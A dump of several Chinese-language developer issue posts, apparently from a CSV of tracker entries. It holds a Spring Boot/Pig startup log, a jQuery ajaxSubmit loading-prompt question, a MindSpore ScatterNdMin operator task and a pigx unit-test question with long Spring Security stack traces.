oot/spring-boot-actuator/2.4.4/spring-boot-actuator-2.4.4.jar:/Users/lengleng/env/repository/com/fasterxml/jackson/datatype/jackson-datatype-jsr310/2.11.4/jackson-datatype-jsr310-2.11.4.jar:/Users/lengleng/env/repository/io/micrometer/micrometer-core/1.6.5/micrometer-core-1.6.5.jar:/Users/lengleng/env/repository/org/hdrhistogram/HdrHistogram/2.1.12/HdrHistogram-2.1.12.jar:/Users/lengleng/env/repository/org/latencyutils/LatencyUtils/2.0.3/LatencyUtils-2.0.3.jar:/Users/lengleng/env/repository/de/codecentric/spring-boot-admin-starter-client/2.4.0/spring-boot-admin-starter-client-2.4.0.jar:/Users/lengleng/env/repository/de/codecentric/spring-boot-admin-client/2.4.0/spring-boot-admin-client-2.4.0.jar:/Users/lengleng/env/repository/org/projectlombok/lombok/1.18.18/lombok-1.18.18.jar:/Users/lengleng/env/repository/net/bytebuddy/byte-buddy/1.10.22/byte-buddy-1.10.22.jar:/Users/lengleng/env/repository/org/springframework/spring-core/5.3.5/spring-core-5.3.5.jar:/Users/lengleng/env/repository/org/springframework/spring-jcl/5.3.5/spring-jcl-5.3.5.jar:/Users/lengleng/Library/Application Support/JetBrains/Toolbox/apps/IDEA-ARM/ch-0/211.6693.111/IntelliJ IDEA.app/Contents/lib/idea_rt.jar com.pig4cloud.pig.admin.PigAdminApplication OpenJDK 64-Bit Server VM warning: forcing TieredStopAtLevel to full optimization because JVMCI is enabled Connected to the target VM, address: '127.0.0.1:56814', transport: 'socket' OpenJDK 64-Bit Server VM warning: Sharing is only supported for boot loader classes because bootstrap classpath has been appended 2021-04-08 23:40:17.858 INFO 83910 --- [kground-preinit] o.h.validator.internal.util.Version : HV000001: Hibernate Validator 6.1.7.Final 2021-04-08 23:40:18.652 INFO 83910 --- [ main] ptablePropertiesBeanFactoryPostProcessor : Post-processing PropertySource instances 2021-04-08 23:40:18.774 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource configurationProperties [org.springframework.boot.context.properties.source.ConfigurationPropertySourcesPropertySource] to AOP Proxy 2021-04-08 23:40:18.776 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource bootstrap [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2021-04-08 23:40:18.777 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource systemProperties [org.springframework.core.env.PropertiesPropertySource] to EncryptableMapPropertySourceWrapper 2021-04-08 23:40:18.777 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource systemEnvironment [org.springframework.boot.env.SystemEnvironmentPropertySourceEnvironmentPostProcessor$OriginAwareSystemEnvironmentPropertySource] to EncryptableMapPropertySourceWrapper 2021-04-08 23:40:18.777 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource random [org.springframework.boot.env.RandomValuePropertySource] to EncryptablePropertySourceWrapper 2021-04-08 23:40:18.778 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource cachedrandom [org.springframework.cloud.util.random.CachedRandomPropertySource] to EncryptablePropertySourceWrapper 2021-04-08 23:40:18.778 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource springCloudClientHostInfo [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2021-04-08 23:40:18.778 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource Config resource 'class path resource [bootstrap.yml]' via location 'optional:classpath:/' [org.springframework.boot.env.OriginTrackedMapPropertySource] to EncryptableMapPropertySourceWrapper 2021-04-08 23:40:18.862 INFO 83910 --- [ main] c.u.j.filter.DefaultLazyPropertyFilter : Property Filter custom Bean not found with name 'encryptablePropertyFilter'. Initializing Default Property Filter 2021-04-08 23:40:18.900 INFO 83910 --- [ main] c.u.j.r.DefaultLazyPropertyResolver : Property Resolver custom Bean not found with name 'encryptablePropertyResolver'. Initializing Default Property Resolver 2021-04-08 23:40:18.902 INFO 83910 --- [ main] c.u.j.d.DefaultLazyPropertyDetector : Property Detector custom Bean not found with name 'encryptablePropertyDetector'. Initializing Default Property Detector ::::::::: ::::::::::: :::::::: :+: :+: :+: :+: :+: +:+ +:+ +:+ +:+ +#++:++#+ +#+ :#: +#+ +#+ +#+ +#+# #+# #+# #+# #+# ### ########### ######## www.pig4cloud.com Pig Microservice Architecture 2021-04-08 23:40:19.361 INFO 83910 --- [ main] org.reflections.Reflections : Reflections took 37 ms to scan 1 urls, producing 3 keys and 6 values 2021-04-08 23:40:19.398 INFO 83910 --- [ main] org.reflections.Reflections : Reflections took 22 ms to scan 1 urls, producing 4 keys and 9 values 2021-04-08 23:40:19.414 INFO 83910 --- [ main] org.reflections.Reflections : Reflections took 12 ms to scan 1 urls, producing 3 keys and 10 values 2021-04-08 23:40:19.418 WARN 83910 --- [ main] org.reflections.Reflections : given scan urls are empty. set urls in the configuration 2021-04-08 23:40:19.428 INFO 83910 --- [ main] org.reflections.Reflections : Reflections took 8 ms to scan 1 urls, producing 1 keys and 5 values 2021-04-08 23:40:19.446 INFO 83910 --- [ main] org.reflections.Reflections : Reflections took 8 ms to scan 1 urls, producing 1 keys and 7 values 2021-04-08 23:40:19.460 INFO 83910 --- [ main] org.reflections.Reflections : Reflections took 9 ms to scan 1 urls, producing 2 keys and 8 values 2021-04-08 23:40:19.465 WARN 83910 --- [ main] org.reflections.Reflections : given scan urls are empty. set urls in the configuration 2021-04-08 23:40:20.287 WARN 83910 --- [ main] c.a.c.n.c.NacosPropertySourceBuilder : Ignore the empty nacos configuration and get it based on dataId[pig-upms-biz] &amp; group[DEFAULT_GROUP] 2021-04-08 23:40:20.296 WARN 83910 --- [ main] c.a.c.n.c.NacosPropertySourceBuilder : Ignore the empty nacos configuration and get it based on dataId[pig-upms-biz.yml] &amp; group[DEFAULT_GROUP] 2021-04-08 23:40:20.309 INFO 83910 --- [ main] b.c.PropertySourceBootstrapConfiguration : Located property source: [BootstrapPropertySource {name='bootstrapProperties-pig-upms-biz-dev.yml,DEFAULT_GROUP'}, BootstrapPropertySource {name='bootstrapProperties-pig-upms-biz.yml,DEFAULT_GROUP'}, BootstrapPropertySource {name='bootstrapProperties-pig-upms-biz,DEFAULT_GROUP'}, BootstrapPropertySource {name='bootstrapProperties-application-dev.yml,DEFAULT_GROUP'}] 2021-04-08 23:40:20.414 INFO 83910 --- [ main] EnableEncryptablePropertiesConfiguration : Bootstraping jasypt-string-boot auto configuration in context: pig-upms-biz-1 2021-04-08 23:40:20.419 INFO 83910 --- [ main] c.p.pig.admin.PigAdminApplication : The following profiles are active: dev 2021-04-08 23:40:22.407 INFO 83910 --- [ main] o.s.c.annotation.AutoProxyRegistrar : AutoProxyRegistrar was imported but no annotations were found having both 'mode' and 'proxyTargetClass' attributes of type AdviceMode and boolean respectively. This means that auto proxy creator registration and configuration may not have occurred as intended, and components may not be proxied as expected. Check to ensure that AutoProxyRegistrar has been @Import'ed on the same class where these annotations are declared; otherwise remove the import of AutoProxyRegistrar altogether. 2021-04-08 23:40:23.054 INFO 83910 --- [ main] .s.d.r.c.RepositoryConfigurationDelegate : Multiple Spring Data modules found, entering strict repository configuration mode! 2021-04-08 23:40:23.056 INFO 83910 --- [ main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data Redis repositories in DEFAULT mode. 2021-04-08 23:40:23.128 INFO 83910 --- [ main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 61 ms. Found 0 Redis repository interfaces. 2021-04-08 23:40:23.597 INFO 83910 --- [ main] o.s.cloud.context.scope.GenericScope : BeanFactory id=4c048ded-29e9-3704-9b5d-d23e802a4e5c 2021-04-08 23:40:23.635 INFO 83910 --- [ main] ptablePropertiesBeanFactoryPostProcessor : Post-processing PropertySource instances 2021-04-08 23:40:23.675 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource bootstrapProperties-pig-upms-biz-dev.yml,DEFAULT_GROUP [org.springframework.cloud.bootstrap.config.BootstrapPropertySource] to EncryptableEnumerablePropertySourceWrapper 2021-04-08 23:40:23.676 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource bootstrapProperties-pig-upms-biz.yml,DEFAULT_GROUP [org.springframework.cloud.bootstrap.config.BootstrapPropertySource] to EncryptableEnumerablePropertySourceWrapper 2021-04-08 23:40:23.676 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource bootstrapProperties-pig-upms-biz,DEFAULT_GROUP [org.springframework.cloud.bootstrap.config.BootstrapPropertySource] to EncryptableEnumerablePropertySourceWrapper 2021-04-08 23:40:23.676 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource bootstrapProperties-application-dev.yml,DEFAULT_GROUP [org.springframework.cloud.bootstrap.config.BootstrapPropertySource] to EncryptableEnumerablePropertySourceWrapper 2021-04-08 23:40:23.677 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource configurationProperties [org.springframework.boot.context.properties.source.ConfigurationPropertySourcesPropertySource] to AOP Proxy 2021-04-08 23:40:23.677 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource servletConfigInitParams [org.springframework.core.env.PropertySource$StubPropertySource] to EncryptablePropertySourceWrapper 2021-04-08 23:40:23.677 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource servletContextInitParams [org.springframework.core.env.PropertySource$StubPropertySource] to EncryptablePropertySourceWrapper 2021-04-08 23:40:23.677 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource systemProperties [org.springframework.core.env.PropertiesPropertySource] to EncryptableMapPropertySourceWrapper 2021-04-08 23:40:23.677 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource systemEnvironment [org.springframework.boot.env.SystemEnvironmentPropertySourceEnvironmentPostProcessor$OriginAwareSystemEnvironmentPropertySource] to EncryptableMapPropertySourceWrapper 2021-04-08 23:40:23.677 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource random [org.springframework.boot.env.RandomValuePropertySource] to EncryptablePropertySourceWrapper 2021-04-08 23:40:23.680 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource cachedrandom [org.springframework.cloud.util.random.CachedRandomPropertySource] to EncryptablePropertySourceWrapper 2021-04-08 23:40:23.681 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource springCloudClientHostInfo [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2021-04-08 23:40:23.681 INFO 83910 --- [ main] c.u.j.EncryptablePropertySourceConverter : Converting PropertySource springCloudDefaultProperties [org.springframework.core.env.MapPropertySource] to EncryptableMapPropertySourceWrapper 2021-04-08 23:40:23.745 INFO 83910 --- [ main] c.u.j.filter.DefaultLazyPropertyFilter : Property Filter custom Bean not found with name 'encryptablePropertyFilter'. Initializing Default Property Filter 2021-04-08 23:40:24.179 INFO 83910 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler@c335b9' of type [org.springframework.security.oauth2.provider.expression.OAuth2MethodSecurityExpressionHandler] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-04-08 23:40:24.206 INFO 83910 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'methodSecurityMetadataSource' of type [org.springframework.security.access.method.DelegatingMethodSecurityMetadataSource] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-04-08 23:40:24.239 INFO 83910 --- [ main] c.u.j.r.DefaultLazyPropertyResolver : Property Resolver custom Bean not found with name 'encryptablePropertyResolver'. Initializing Default Property Resolver 2021-04-08 23:40:24.239 INFO 83910 --- [ main] c.u.j.d.DefaultLazyPropertyDetector : Property Detector custom Bean not found with name 'encryptablePropertyDetector'. Initializing Default Property Detector 2021-04-08 23:40:24.436 INFO 83910 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'spring.cloud.sentinel-com.alibaba.cloud.sentinel.SentinelProperties' of type [com.alibaba.cloud.sentinel.SentinelProperties] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) INFO: Sentinel log output type is: file INFO: Sentinel log charset is: utf-8 INFO: Sentinel log base directory is: /Users/lengleng/logs/csp/ INFO: Sentinel log name use pid is: false 2021-04-08 23:40:24.543 INFO 83910 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'com.alibaba.cloud.sentinel.custom.SentinelAutoConfiguration' of type [com.alibaba.cloud.sentinel.custom.SentinelAutoConfiguration] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-04-08 23:40:25.141 WARN 83910 --- [ main"
jquery.form  ajaxSubmit 提示不起作用,"在提交form时，使用了jquery.form ajaxSubmit来提交，后台数据库比较大，处理时间比较长。 1：在打开页面时，出有“正在加载，请稍候。。。”的提示，但在form加载成功之后，提示小时，这时form请求的数据还没有返回。 2：第一步完成后，出现数据后，再次点击查询， “正在加载，请稍候。。。” 没有出现。但ajax 已经发起了请求。 是我哪里写代码不正确吗？还请帮助解决一下，谢谢。 代码如下：   <code>: Form: &lt;#form:form id=""searchForm"" model=""${model}"" class=""form-inline hide"" action=""${ctx}/mydata"" method=""post"" onsubmit=""return myajax();""&gt; //查询条件 &lt;/#form:form&gt; JS: function myajax() { $(""#searchForm"").ajaxSubmit({ beforeSubmit: function () { js.loading('正在玩命加载。。。'); }, success: function (data) { alert('OK'); js.closeLoading(500, true); }, error: function (error) { alert(error); }, dataType: ""json"" }); return false; }"
【众智】【计算-AICPU开发】ScatterNdMin,"ScatterNdMin 根据索引从现有张量和指定张量中取最小值 use_locking bool 属性 var indices updates var 对应底层算子 对应底层AICPU算子ScatterNdMin @ops.RegisterGradient(""TensorScatterMin"")   <code>: class ScatterNdMin(Primitive):"
包含用户验证的接口怎么做单元测试,"环境信息 pigx版本: 3.9 @RunWith(SpringRunner.class) @SpringBootTest(classes = PigxActivitiApplication.class,webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT) public class ProcessServiceImplTest { } 2020-09-21 15:04:11.689 INFO 17896 --- [ main] c.netflix.loadbalancer.BaseLoadBalancer : Client: pigx-upms-biz instantiated a LoadBalancer: DynamicServerListLoadBalancer:{NFLoadBalancer:name=pigx-upms-biz,current list of Servers=[],Load balancer stats=Zone stats: {},Server stats: []}ServerList:null 2020-09-21 15:04:11.697 INFO 17896 --- [ main] c.n.l.DynamicServerListLoadBalancer : Using serverListUpdater PollingServerListUpdater 2020-09-21 15:04:11.780 INFO 17896 --- [ main] c.n.l.DynamicServerListLoadBalancer : DynamicServerListLoadBalancer for client pigx-upms-biz initialized: DynamicServerListLoadBalancer:{NFLoadBalancer:name=pigx-upms-biz,current list of Servers=[192.168.1.41:4000],Load balancer stats=Zone stats: {unknown=[Zone:unknown; Instance count:1; Active connections count: 0; Circuit breaker tripped count: 0; Active connections per server: 0.0;] },Server stats: [[Server:192.168.1.41:4000; Zone:UNKNOWN; Total Requests:0; Successive connection failure:0; Total blackout seconds:0; Last connection made:Thu Jan 01 08:00:00 CST 1970; First connection made: Thu Jan 01 08:00:00 CST 1970; Active Connections:0; total failure count in last (1000) msecs:0; average resp time:0.0; 90 percentile resp time:0.0; 95 percentile resp time:0.0; min resp time:0.0; max resp time:0.0; stddev resp time:0.0] ]}ServerList:com.alibaba.cloud.nacos.ribbon.NacosServerList@3683c47f 2020-09-21 15:04:12.035 ERROR 17896 --- [ main] .p.p.c.s.f.PigxSentinelInvocationHandler : feign 服务间调用异常 feign.FeignException$InternalServerError: [500 Internal Server Error] during [GET] to [http://pigx-upms-biz/user/info/wuchang] [RemoteUserService#info(String,String)]: [{""code"":1,""msg"":""Name for argument type [java.lang.String] not available, and parameter name information not found in class file either."",""data"":null}] at feign.FeignException.serverErrorStatus(FeignException.java:231) at feign.FeignException.errorStatus(FeignException.java:180) at feign.FeignException.errorStatus(FeignException.java:169) at feign.codec.ErrorDecoder$Default.decode(ErrorDecoder.java:92) at feign.AsyncResponseHandler.handleResponse(AsyncResponseHandler.java:96) at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:138) at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89) at com.pig4cloud.pigx.common.sentinel.feign.PigxSentinelInvocationHandler.invoke(PigxSentinelInvocationHandler.java:100) at com.sun.proxy.$Proxy185.info(Unknown Source) at com.pig4cloud.pigx.act.service.impl.MockUserService.loadUserByUsername(MockUserService.java:52) at org.springframework.security.test.context.support.WithUserDetailsSecurityContextFactory.createSecurityContext(WithUserDetailsSecurityContextFactory.java:61) at org.springframework.security.test.context.support.WithUserDetailsSecurityContextFactory.createSecurityContext(WithUserDetailsSecurityContextFactory.java:44) at org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener.createTestSecurityContext(WithSecurityContextTestExecutionListener.java:123) at org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener.createTestSecurityContext(WithSecurityContextTestExecutionListener.java:96) at org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener.beforeTestMethod(WithSecurityContextTestExecutionListener.java:62) at org.springframework.test.context.TestContextManager.beforeTestMethod(TestContextManager.java:289) at org.springframework.test.context.junit.jupiter.SpringExtension.beforeEach(SpringExtension.java:108) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeBeforeEachCallbacks$1(TestMethodTestDescriptor.java:161) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeBeforeMethodsOrCallbacksUntilExceptionOccurs$5(TestMethodTestDescriptor.java:197) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeBeforeMethodsOrCallbacksUntilExceptionOccurs(TestMethodTestDescriptor.java:197) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeBeforeEachCallbacks(TestMethodTestDescriptor.java:160) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:131) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:71) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$5(NodeTestTask.java:135) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$7(NodeTestTask.java:125) at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:135) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:123) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:122) at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:80) at java.util.ArrayList.forEach(ArrayList.java:1257) at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:38) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$5(NodeTestTask.java:139) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$7(NodeTestTask.java:125) at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:135) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:123) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:122) at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:80) at java.util.ArrayList.forEach(ArrayList.java:1257) at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:38) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$5(NodeTestTask.java:139) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$7(NodeTestTask.java:125) at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:135) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:123) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:122) at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:80) at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:32) at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:51) at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:248) at org.junit.platform.launcher.core.DefaultLauncher.lambda$execute$5(DefaultLauncher.java:211) at org.junit.platform.launcher.core.DefaultLauncher.withInterceptedStreams(DefaultLauncher.java:226) at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:199) at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:132) at com.intellij.junit5.JUnit5IdeaTestRunner.startRunnerWithArgs(JUnit5IdeaTestRunner.java:71) at com.intellij.rt.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:33) at com.intellij.rt.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:220) at com.intellij.rt.junit.JUnitStarter.main(JUnitStarter.java:53) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at com.intellij.rt.execution.CommandLineWrapper.main(CommandLineWrapper.java:63) 2020-09-21 15:04:12.036 WARN 17896 --- [ main] o.s.test.context.TestContextManager : Caught exception while invoking 'beforeTestMethod' callback on TestExecutionListener [org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener@89ff02e] for test method [void com.pig4cloud.pigx.act.service.impl.ProcessServiceImplTest.saveStartPollutantProcess()] and test instance [com.pig4cloud.pigx.act.service.impl.ProcessServiceImplTest@15a902e7] java.lang.IllegalStateException: Unable to create SecurityContext using @org.springframework.security.test.context.support.WithUserDetails(setupBefore=TEST_METHOD, userDetailsServiceBeanName=mockUserService, value=wuchang) at org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener.createTestSecurityContext(WithSecurityContextTestExecutionListener.java:126) at org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener.createTestSecurityContext(WithSecurityContextTestExecutionListener.java:96) at org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener.beforeTestMethod(WithSecurityContextTestExecutionListener.java:62) at org.springframework.test.context.TestContextManager.beforeTestMethod(TestContextManager.java:289) at org.springframework.test.context.junit.jupiter.SpringExtension.beforeEach(SpringExtension.java:108) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeBeforeEachCallbacks$1(TestMethodTestDescriptor.java:161) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeBeforeMethodsOrCallbacksUntilExceptionOccurs$5(TestMethodTestDescriptor.java:197) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeBeforeMethodsOrCallbacksUntilExceptionOccurs(TestMethodTestDescriptor.java:197) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeBeforeEachCallbacks(TestMethodTestDescriptor.java:160) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:131) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:71) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$5(NodeTestTask.java:135) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$7(NodeTestTask.java:125) at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:135) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:123) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:122) at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:80) at java.util.ArrayList.forEach(ArrayList.java:1257) at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:38) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$5(NodeTestTask.java:139) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$7(NodeTestTask.java:125) at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:135) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:123) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:122) at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:80) at java.util.ArrayList.forEach(ArrayList.java:1257) at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:38) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$5(NodeTestTask.java:139) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$7(NodeTestTask.java:125) at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:135) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:123) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:122) at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:80) at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:32) at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:51) at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:248) at org.junit.platform.launcher.core.DefaultLauncher.lambda$execute$5(DefaultLauncher.java:211) at org.junit.platform.launcher.core.DefaultLauncher.withInterceptedStreams(DefaultLauncher.java:226) at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:199) at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:132) at com.intellij.junit5.JUnit5IdeaTestRunner.startRunnerWithArgs(JUnit5IdeaTestRunner.java:71) at com.intellij.rt.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:33) at com.intellij.rt.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:220) at com.intellij.rt.junit.JUnitStarter.main(JUnitStarter.java:53) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at com.intellij.rt.execution.CommandLineWrapper.main(CommandLineWrapper.java:63) Caused by: org.springframework.security.core.userdetails.UsernameNotFoundException: 用户不存在 at com.pig4cloud.pigx.act.service.impl.MockUserService.getUserDetails(MockUserService.java:77) at com.pig4cloud.pigx.act.service.impl.MockUserService.loadUserByUsername(MockUserService.java:53) at org.springframework.security.test.context.support.WithUserDetailsSecurityContextFactory.createSecurityContext(WithUserDetailsSecurityContextFactory.java:61) at org.springframework.security.test.context.support.WithUserDetailsSecurityContextFactory.createSecurityContext(WithUserDetailsSecurityContextFactory.java:44) at org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener.createTestSecurityContext(WithSecurityContextTestExecutionListener.java:123) ... 56 common frames omitted java.lang.IllegalStateException: Unable to create SecurityContext using @org.springframework.security.test.context.support.WithUserDetails(setupBefore=TEST_METHOD, userDetailsServiceBeanName=mockUserService, value=wuchang) Caused by: org.springframework.security.core.userdetails.UsernameNotFoundException: 用户不存在 at com.pig4cloud.pigx.act.service.impl.MockUserService.getUserDetails(MockUserService.java:77) at com.pig4cloud.pigx.act.service.impl.MockUserService.loadUserByUsername(MockUserService.java:53) at 